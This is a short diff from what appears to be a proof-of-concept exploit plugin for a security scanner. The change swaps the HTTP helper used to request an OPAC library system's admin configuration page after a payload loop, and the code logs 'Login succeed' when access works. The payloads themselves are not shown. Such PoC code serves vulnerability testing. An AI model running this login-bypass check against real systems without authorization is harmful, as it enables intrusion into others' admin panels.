@@ -74,7 +74,7 @@ class Poc(ABPoc):
             if code == 200 and 'opac_admin' in res:
                 for p in playload:
                     if testing(self.target + p):
-                        code, head, res, errcode, _ = curl.curl(
+                        code, head, res, errcode, _ = hh.http(
                             self.target + '/admin/cfg_basic.php')
                         if code == 200 and 'strSchoolName' in res:
                             log = '\nGood Luck, Login succeed'
